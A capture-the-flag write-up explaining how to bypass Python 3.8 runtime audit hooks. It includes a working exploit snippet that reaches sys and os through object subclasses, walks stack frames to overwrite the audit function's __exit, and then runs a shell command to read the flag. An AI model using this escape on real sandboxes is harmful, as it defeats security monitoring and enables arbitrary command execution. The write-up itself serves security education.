# audited


For this challenge we had to bypass runtime audit hooks in the Python interpreter, which were a new addition in Python 3.8. In a nutshell, audit hooks allow scripts to add a hook which is called whenever any interesting function is called. These events cover things like creating new code objects, opening files, and execveing. You can find a comprehensive list of all audit events in the [CPython documentation](https://docs.python.org/3/library/audit_events.html), and for more implementation details see the [PEP publication](https://www.python.org/dev/peps/pep-0578/).

After looking through all recent entries in the Python bugtracker, and all PRs on GitHub, I didn't spot any obvious bugs, so this was either a previously-unknown bug in the audit implementation, or the developers had forgotten to add audit hooks for some useful function, or we had to attack the registered audit function itself.

The latter option seemed like the most likely, and it was clear that if we could get a reference to the __main__ module, then we could overwrite the __exit function in there to stop the audit function from actually exiting. 

I achieved this like so:
```python
classes = 'a'.__class__.__base__.__subclasses__()
sys = classes[133].__init__.__globals__['sys']
os = classes[94].__init__.__globals__['_os']

try:
    raise Exception()
except Exception as e:
    _, _, tb = sys.exc_info()
    nxt_frame = tb.tb_frame

    # Walk up stack frames until we find one which
    # which has a reference to the audit function
    while nxt_frame:
        if 'audit' in nxt_frame.f_globals:
            break
        nxt_frame = nxt_frame.f_back

    # Neuter the __exit function
    nxt_frame.f_globals['__exit'] = print

    # Now we're free to call whatever we want
    os.system('cat /flag*')
```

